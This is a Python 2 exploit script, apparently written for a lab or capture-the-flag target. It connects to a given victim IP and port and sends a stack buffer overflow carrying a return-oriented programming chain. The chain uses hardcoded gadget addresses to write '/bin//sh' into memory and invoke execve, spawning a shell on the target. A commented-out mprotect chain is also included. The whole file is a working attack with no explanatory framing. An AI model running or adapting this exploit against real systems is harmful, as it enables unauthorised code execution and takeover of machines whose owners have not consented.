#!/usr/bin/env python2

import socket
import os
import time
import sys
from struct import pack

if len(sys.argv) != 3:
   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
   sys.exit(1)

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)

# 8050a88:       31 d2                   xor    %edx,%edx
# 8050a8a:       8b 5d f4                mov    -0xc(%ebp),%ebx
# 8050a8d:       8b 75 f8                mov    -0x8(%ebp),%esi
# 8050a90:       89 d0                   mov    %edx,%eax
# 8050a92:       8b 7d fc                mov    -0x4(%ebp),%edi
# 8050a95:       89 ec                   mov    %ebp,%esp
# 8050a97:       5d                      pop    %ebp
# 8050a98:       c3                      ret

EDAX0      = pack("<I", 0x08050a88)
STACK      = pack("<I", 0x080c8081) # .data 0xba0   0x80c8080
INT80      = pack("<I", 0x0805a046) # int $0x80
MOVISTACK  = pack("<I", 0x080503a2) # mov %eax,(%ecx) | pop %ebp | ret
INCEAX     = pack("<I", 0x080823df) # inc %eax | ret
POPALL     = pack("<I", 0x08059f70) # pop %edx | pop %ecx | pop %ebx | ret
POPEAX     = pack("<I", 0x0809ae7a) # pop %eax | pop %ebx | pop %esi | pop %edi | ret
XOREAX     = pack("<I", 0x080570f4) # xor %eax,%eax | ret
DUMMY      = pack("<I", 0x42424242) # padding

buff  = "\x41" * 507

######################## mprotect ##########################
#buff += EDAX0
#buff += DUMMY * 2
#buff += XOREAX
#buff += INCEAX * 125
#buff += POPALL
#buff += pack("<I", 0x) # edx | int prot
#buff += pack("<I", 0x) # ecx | size_t len
#buff += pack("<I", 0x) # ebx | void *addr
#buff += INT80
######################## mprotect ##########################


######################### execve ###########################
buff += POPALL
buff += STACK
buff += STACK
buff += STACK

buff += POPEAX
buff += "/bin"
buff += STACK
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += STACK
buff += pack("<I", 0x080c8081 + 4)
buff += STACK

buff += POPEAX
buff += "//sh"
buff += STACK
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += XOREAX
buff += INCEAX * 11
buff += POPALL
buff += pack("<I", 0x080c8081 + 24)
buff += pack("<I", 0x080c8081 + 24)
buff += pack("<I", 0x080c8081)
buff += INT80
######################### execve ###########################

cmdID = "3 "
arg3  = " "+buff
arg2  = str(len(arg3))
payload = cmdID + arg2 + arg3 

print "[+] Send payload..."
try:
   s.send(payload)
   s.close
except:
   print "[-] Error send payload"
   sys.exit(1)
print "[+] done!"

